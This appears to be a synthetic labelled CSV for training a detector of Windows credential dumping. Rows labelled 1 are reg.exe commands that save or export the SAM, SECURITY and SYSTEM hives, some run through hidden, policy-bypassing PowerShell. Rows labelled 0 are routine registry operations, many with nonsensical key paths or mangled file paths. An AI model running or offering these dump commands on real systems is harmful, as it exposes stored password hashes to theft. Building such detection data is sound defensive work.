text,label
cmd.exe /c start /b reg.exe  export hkey_local_machine\sam   %temp%\sec_backup.dat   /y,1
"start /b reg.exe  delete  ""hkey_users\software\classes""  /f",0
reg  export   hkey_local_machine\security  %temp%\sec_backup.dat,1
reg.exe  export   hkey_local_machine\security  c:\windows\temp\sam.save   /y,1
"cmd /c reg   query   ""hkey_local_machine\software\myapp\settings\subkey73""   /v lastupdate",0
"reg.exe   restore   ""hkey_users\hkey_local_machine\software\wow6432node""   ""hkey_users\hkey_local_machine\software\policies\microsoft_712""",0
powershell -command reg  export   hkey_local_machine\security  c:\temp\system.hive,1
"reg.exe  unload  ""hkey_local_machine\software\google\chrome""  /v path",0
"reg.exe delete ""hkey_current_user\environment\subkey92"" /v version",0
powershell -command reg.exe  export hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg.exe export hklm\sam c:\users\public\registry_export.reg,1
"reg query ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey64""",0
"reg.exe   unload   ""hku\environment""   /v lastupdate",0
"cmd /c reg   compare   ""hkey_users\software\google\chrome""   ""hkey_users\hkey_local_machine\software\wow6432node_596""",0
pwsh -noprofile -c reg.exe   export hkey_local_machine\sam  %temp%\sec_backup.dat   /y,1
pwsh -noprofile -c reg.exe  save  hklm\security   \.\c$ackup.reg,1
cmd.exe /c start /b reg   export  hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak   /y,1
"powershell -c reg add ""hku\software\google\chrome"" /f  /d ""1.0.0""",0
"start /b reg  compare  ""hkey_current_user\software\classes""  ""hkey_current_user\software\policies\mycorp_748""",0
"reg.exe   copy   ""hku\software\policies\mycorp""   ""hku\environment_875""",0
c:\windows\system32\cmd.exe /k reg.exe   save  hklm\system   \.\c$ackup.reg   /y,1
reg.exe   save   hkey_local_machine\system   c:\users\public\registry_export.reg  /y,1
"cmd /c powershell -c ""reg save hkey_local_machine\system \\localhost\c$\__dump\sam.bak""",1
"reg save ""hku\hkey_local_machine\system\currentcontrolset\control"" ""%temp%\non_sensitive.hive""",0
powershell -command reg save   hklm\security   \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg.exe save hklm\sam  c:\temp\system.hive  /y,1
cmd.exe /c reg   save hkey_local_machine\system  \.\c$ackup.reg,1
"powershell -c reg.exe  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  ""%temp%\non_sensitive.hive""",0
"cmd /c reg   restore   ""hkcu\software\policies\mycorp\subkey16""   ""hkcu\software\microsoft\windows\currentversion_460""",0
"cmd /c powershell -c ""reg  save  hklm\security   c:\temp\system.hive""",1
powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\sam   c:\users\public\registry_export.reg  /y,1
cmd.exe /c reg  save  hklm\security \.\c$ackup.reg,1
"reg   query   ""hkey_local_machine\environment\subkey41""   /f",0
"cmd /c powershell -c ""reg.exe   save   hklm\sam  c:\temp\system.hive""",1
reg.exe  export hklm\security   c:\users\public\registry_export.reg  /y,1
"reg.exe query ""hku\software\microsoft\windows\currentversion\subkey63"" /v lastupdate",0
reg   save   hkey_local_machine\system  c:\users\public\registry_export.reg /y,1
"reg delete ""hkcu\hkey_local_machine\software\wow6432node"" /v version",0
"cmd /c reg.exe delete ""hku\system\currentcontrolset\services\subkey2""",0
"reg.exe  add  ""hkey_local_machine\software\google\chrome\subkey47""  /v path",0
cmd.exe /c start /b reg.exe  export  hklm\security \.\c$ackup.reg   /y,1
"reg.exe delete ""hku\software\microsoft\windows\currentversion"" /v path",0
powershell -command reg save hkey_local_machine\system c:\users\public\registry_export.reg   /y,1
pwsh -noprofile -c reg   save   hkey_local_machine\security  c:\users\public\registry_export.reg   /y,1
"reg.exe restore ""hkcu\software\google\chrome\subkey18"" ""hkcu\system\currentcontrolset\services_918""",0
cmd.exe /c reg.exe  save hklm\security  \.\c$ackup.reg /y,1
"reg.exe  query  ""hkcu\control panel\desktop\subkey61""  /v lastupdate",0
cmd.exe /c start /b reg.exe   export   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak,1
reg.exe   export  hkey_local_machine\security  c:\windows\temp\sam.save   /y,1
"reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" ""d:\backup\registry_hive.dat"" /y",0
"powershell -c reg  query  ""hkey_current_user\environment""  /f",0
cmd.exe /c reg.exe export   hkey_local_machine\system  c:\temp\system.hive  /y,1
"powershell -c reg.exe save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey41"" ""d:\backup\registry_hive.dat""",0
"reg.exe restore ""hkey_current_user\system\currentcontrolset\services"" ""hkey_current_user\control panel\desktop_899""",0
powershell -command reg  save   hklm\system   c:\users\public\registry_export.reg /y,1
reg   save hklm\sam  \.\c$ackup.reg  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save   hklm\system  \\localhost\c$\__dump\sam.bak,1
"cmd /c powershell -c ""reg.exe export hkey_local_machine\sam  c:\windows\temp\sam.save  /y""",1
"powershell -c reg   add   ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey91""   /v lastupdate   /t reg_sz   /d ""1.0.0""",0
"cmd /c powershell -c ""reg  export hklm\system \.\c$ackup.reg""",1
c:\windows\system32\cmd.exe /k reg   export   hklm\system  c:\windows\temp\sam.save,1
"cmd /c reg   query   ""hkey_local_machine\software\policies\mycorp\subkey22""   /f",0
"reg   add   ""hkey_local_machine\control panel\desktop\subkey72""         /d ""c:\program files\app""",0
"reg  unload  ""hkey_users\software\policies\mycorp\subkey33""  /v lastupdate",0
"start /b reg.exe compare ""hkey_current_user\control panel\desktop\subkey49"" ""hkey_current_user\system\currentcontrolset\services_698""",0
"reg.exe   compare   ""hkey_current_user\software\microsoft\windows\currentversion""   ""hkey_current_user\software\policies\mycorp_594""",0
"start /b reg   delete   ""hkcu\environment""   /v path",0
"reg  add  ""hku\software\policies\mycorp\subkey83""  /f    /d ""1.0.0""",0
reg.exe  save  hkey_local_machine\system  c:\windows\temp\sam.save,1
reg  save   hkey_local_machine\system   \.\c$ackup.reg /y,1
reg.exe export hklm\system   c:\users\public\registry_export.reg  /y,1
cmd.exe /c start /b reg.exe  export  hkey_local_machine\security  c:\temp\system.hive,1
"powershell -c reg.exe   unload   ""hkey_users\environment""",0
powershell -exec bypass -w hidden -c reg.exe export  hkey_local_machine\sam \.\c$ackup.reg,1
"reg copy ""hkey_current_user\control panel\desktop\subkey74"" ""hkey_current_user\system\currentcontrolset\services_766""",0
cmd.exe /c reg export hkey_local_machine\system \\localhost\c$\__dump\sam.bak  /y,1
c:\windows\system32\cmd.exe /k reg.exe   save hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
cmd.exe /c reg.exe save hklm\system  \\localhost\c$\__dump\sam.bak,1
"reg   restore   ""hku\hkey_local_machine\software\policies\microsoft\subkey93""   ""hku\software\classes_220""",0
pwsh -noprofile -c reg.exe  save   hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
"reg.exe   restore   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey53""   ""hkey_current_user\software\google\chrome_834""",0
"reg.exe query ""hkey_local_machine\system\currentcontrolset\services"" /v lastupdate",0
"powershell -c reg  delete  ""hkey_local_machine\software\microsoft\windows\currentversion""  /f",0
"reg.exe  delete  ""hkey_users\software\policies\mycorp""",0
"reg   copy   ""hkey_users\software\policies\mycorp\subkey77""   ""hkey_users\control panel\desktop_750""",0
powershell -command reg.exe   save   hkey_local_machine\security   %temp%\sec_backup.dat   /y,1
cmd.exe /c start /b reg  export  hkey_local_machine\system   c:\users\public\registry_export.reg  /y,1
"cmd /c reg.exe   copy   ""hkey_local_machine\software\microsoft\windows\currentversion""   ""hkey_local_machine\system\currentcontrolset\services_662""",0
cmd.exe /c reg.exe export hklm\system c:\temp\system.hive,1
reg export   hkey_local_machine\security c:\temp\system.hive /y,1
"reg   compare   ""hku\hkey_local_machine\software\wow6432node\subkey72""   ""hku\software\myapp\settings_843""",0
"reg  compare  ""hkcu\environment""  ""hkcu\software\google\chrome_794""",0
powershell -command reg   save hkey_local_machine\sam   \.\c$ackup.reg   /y,1
"reg   compare   ""hkcu\environment""   ""hkcu\environment_907""",0
"cmd /c powershell -c ""reg export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak   /y""",1
"reg.exe  add  ""hkey_users\software\classes""  /v path",0
cmd.exe /c start /b reg export   hklm\system \.\c$ackup.reg /y,1
pwsh -noprofile -c reg  export hkey_local_machine\sam c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg   export   hklm\system  %temp%\sec_backup.dat,1
"cmd /c powershell -c ""reg   export   hkey_local_machine\sam c:\temp\system.hive""",1
"start /b reg.exe   save   ""hkey_local_machine\software\myapp\settings""   ""c:\temp\user_settings.reg""   /y",0
"cmd /c powershell -c ""reg save hklm\security   \\localhost\c$\__dump\sam.bak /y""",1
cmd.exe /c reg   save hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
"reg.exe   restore   ""hkey_local_machine\hkey_local_machine\software\wow6432node""   ""hkey_local_machine\software\policies\mycorp_646""",0
"reg.exe unload ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey24""",0
"reg  copy  ""hku\software\policies\mycorp""  ""hku\software\google\chrome_686""",0
"start /b reg copy ""hku\software\policies\mycorp\subkey6"" ""hku\software\microsoft\windows\currentversion_244""",0
powershell -exec bypass -w hidden -c reg.exe   export hklm\sam %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg.exe   export hklm\sam \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg.exe export  hklm\system c:\windows\temp\sam.save  /y,1
"powershell -c reg   restore   ""hkey_current_user\software\microsoft\windows\currentversion\subkey15""   ""hkey_current_user\software\microsoft\windows\currentversion_950""",0
powershell -exec bypass -w hidden -c reg save hkey_local_machine\sam \\localhost\c$\__dump\sam.bak /y,1
"cmd /c reg   copy   ""hkey_local_machine\environment""   ""hkey_local_machine\software\classes_212""",0
"cmd /c reg  query  ""hkey_local_machine\software\classes\subkey32""  /v lastupdate",0
pwsh -noprofile -c reg.exe  export hklm\sam   c:\temp\system.hive /y,1
"powershell -c reg   delete   ""hkey_current_user\system\currentcontrolset\services""   /v path",0
cmd.exe /c reg save  hkey_local_machine\security %temp%\sec_backup.dat   /y,1
"reg.exe  delete  ""hkcu\environment\subkey14""  /v path",0
"reg  restore  ""hkey_users\hkey_local_machine\software\wow6432node\subkey1""  ""hkey_users\software\policies\mycorp_239""",0
c:\windows\system32\cmd.exe /k reg save hkey_local_machine\security c:\temp\system.hive,1
"start /b reg.exe copy ""hkey_local_machine\software\classes"" ""hkey_local_machine\control panel\desktop_860""",0
"cmd /c reg.exe  compare  ""hkcu\software\microsoft\windows\currentversion""  ""hkcu\software\policies\mycorp_257""",0
"reg.exe   delete   ""hkey_local_machine\software\google\chrome""   /v path",0
"reg  copy  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey69""  ""hkey_current_user\software\microsoft\windows\currentversion_210""",0
"reg.exe   restore   ""hkcu\hkey_local_machine\software\policies\microsoft""   ""hkcu\control panel\desktop_347""",0
powershell -exec bypass -w hidden -c reg   save hkey_local_machine\system  %temp%\sec_backup.dat,1
"start /b reg  add  ""hkey_local_machine\software\microsoft\windows\currentversion""  /f  /t reg_dword  /d 1",0
powershell -command reg.exe  export hkey_local_machine\system  c:\windows\temp\sam.save   /y,1
"reg  add  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey62""  /v path    /d ""c:\program files\app""",0
"reg   save   ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey100""   ""d:\backup\registry_hive.dat""",0
"cmd /c reg.exe delete ""hkey_current_user\environment\subkey87"" /v path",0
cmd.exe /c start /b reg   save hklm\sam c:\users\public\registry_export.reg,1
cmd.exe /c reg.exe export  hkey_local_machine\security \.\c$ackup.reg /y,1
cmd.exe /c start /b reg  save hklm\sam %temp%\sec_backup.dat /y,1
"start /b reg compare ""hkcu\software\microsoft\windows\currentversion\subkey38"" ""hkcu\environment_963""",0
reg.exe   save  hkey_local_machine\sam %temp%\sec_backup.dat   /y,1
cmd.exe /c start /b reg  save  hkey_local_machine\sam c:\temp\system.hive  /y,1
"powershell -c reg.exe   delete   ""hkey_current_user\software\google\chrome\subkey87""   /v version",0
c:\windows\system32\cmd.exe /k reg.exe  export  hklm\sam   \\localhost\c$\__dump\sam.bak /y,1
"reg  unload  ""hkey_local_machine\software\myapp\settings\subkey17""  /v path",0
powershell -command reg.exe   save hklm\sam   \.\c$ackup.reg,1
"powershell -c reg   restore   ""hkey_users\system\currentcontrolset\services""   ""hkey_users\control panel\desktop_882""",0
"powershell -c reg.exe   restore   ""hkey_current_user\software\microsoft\windows\currentversion""   ""hkey_current_user\hkey_local_machine\software\wow6432node_743""",0
cmd.exe /c start /b reg export  hkey_local_machine\security   \.\c$ackup.reg  /y,1
"start /b reg delete ""hkey_users\software\google\chrome"" /v path",0
powershell -command reg save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe export  hklm\security   c:\windows\temp\sam.save,1
"reg add ""hkey_local_machine\software\google\chrome\subkey17"" /v path /t reg_dword /d ""1.0.0""",0
"cmd /c reg.exe  add  ""hkey_local_machine\software\policies\mycorp""  /v lastupdate  /t reg_sz  /d 1",0
"reg.exe save ""hkcu\hkey_local_machine\system\currentcontrolset\control"" ""c:\temp\user_settings.reg"" /y",0
"powershell -c reg compare ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey62"" ""hkey_current_user\software\microsoft\windows\currentversion_121""",0
"reg.exe  unload  ""hkcu\system\currentcontrolset\services\subkey46""  /v path",0
"cmd /c reg   add   ""hkey_users\hkey_local_machine\system\currentcontrolset\control\subkey79""   /v lastupdate   /t reg_dword",0
"reg   restore   ""hkey_users\system\currentcontrolset\services\subkey25""   ""hkey_users\software\policies\mycorp_541""",0
powershell -command reg  export hklm\security   \\localhost\c$\__dump\sam.bak,1
"reg   restore   ""hkey_local_machine\software\myapp\settings\subkey71""   ""hkey_local_machine\software\classes_225""",0
cmd.exe /c start /b reg   export hkey_local_machine\sam  c:\windows\temp\sam.save   /y,1
"reg.exe copy ""hkey_local_machine\environment\subkey95"" ""hkey_local_machine\hkey_local_machine\software\wow6432node_960""",0
"powershell -c reg   unload   ""hku\software\policies\mycorp\subkey47""   /v version",0
powershell -exec bypass -w hidden -c reg   export hklm\system c:\windows\temp\sam.save  /y,1
powershell -command reg.exe save hklm\security   c:\users\public\registry_export.reg /y,1
"reg.exe query ""hkey_current_user\software\microsoft\windows\currentversion\subkey41"" /v path",0
powershell -exec bypass -w hidden -c reg   export   hklm\sam  \\localhost\c$\__dump\sam.bak  /y,1
powershell -exec bypass -w hidden -c reg.exe   save  hklm\security   %temp%\sec_backup.dat,1
"reg.exe   delete   ""hkcu\software\microsoft\windows\currentversion""   /v path",0
"start /b reg.exe copy ""hkcu\software\policies\mycorp"" ""hkcu\software\classes_740""",0
"cmd /c reg.exe  compare  ""hkcu\hkey_local_machine\system\currentcontrolset\control""  ""hkcu\control panel\desktop_753""",0
